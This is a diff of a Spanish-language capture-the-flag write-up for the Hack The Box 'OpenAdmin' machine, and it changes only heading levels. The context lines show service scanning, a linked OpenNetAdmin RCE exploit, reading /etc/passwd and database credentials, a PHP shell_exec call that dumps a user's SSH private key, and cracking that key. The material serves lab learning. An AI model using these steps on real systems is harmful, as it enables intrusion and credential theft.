@@ -1,6 +1,6 @@
 # Openadmin ![Avatar](https://www.hackthebox.eu/storage/avatars/5b00db157dbbd7099ff6c0ef10f910ea_thumb.png)     
 
-### Initial Scan
+## Initial Scan
 
 ```nmap
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -12,7 +12,7 @@
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 ```
-### Enumeration
+## Enumeration
 
 Empecemos enumerando el servicio web 
 ```bash
@@ -22,7 +22,7 @@ gobuster dir -u http://10.10.10.171/ -w wordlists/big.txt
 /sierra (Status: 301)
 ```
 Miramos en /music y cuando pulsas el login nos lleva a /ona donde se nor muestra una pantalla de el servicio OpenNetAdmin donde se nos revela que la versión es la 18.1.1
-### Exploit
+## Exploit
 
 La versión de OpenNetAdmin presenta una vulerabilidad RCE conocida
 ```
@@ -30,16 +30,16 @@ https://www.exploit-db.com/exploits/47691
 ```
 Usandolo obtenemos una shell como www-data
 
-### Local recon
+## Local recon
 
-#### Enumeramos usuarios con acceso via shell
+### Enumeramos usuarios con acceso via shell
 ```
 $ cat /etc/passwd | grep 'bash'
 root:x:0:0:root:/root:/bin/bash
 jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
 joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
 ```
-#### Buscamos contraseñas
+### Buscamos contraseñas
 ```
 cat local/config/database
     'db_type' => 'mysqli',
@@ -73,13 +73,13 @@ total 12
 ```
 
 En index.php encontramos el siguiente fragmento de código
-#### Index.php
+### Index.php
 ```
 if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
     if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
 }
 ```
-#### Main.php
+### Main.php
 ```
 $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
 echo "<pre>$output</pre>";
@@ -94,7 +94,7 @@ curl localhost:52846/main.php -H "PHPSESSID=i3spbj9jben1bon5alpr0ek1at" -v
 ```
 Con esto obtenemos la clave RSA
 
-#### Crackeando la clave
+### Crackeando la clave
 
 Guardamos la clave RSA en local y la crrackeamos
 ```bash
@@ -111,7 +111,7 @@ joanna@openadmin:~$ wc -c user.txt
 33 user.txt
 ```
 
-### Privesc
+## Privesc
 
 ```bash
 joanna@openadmin:~$ sudo -l
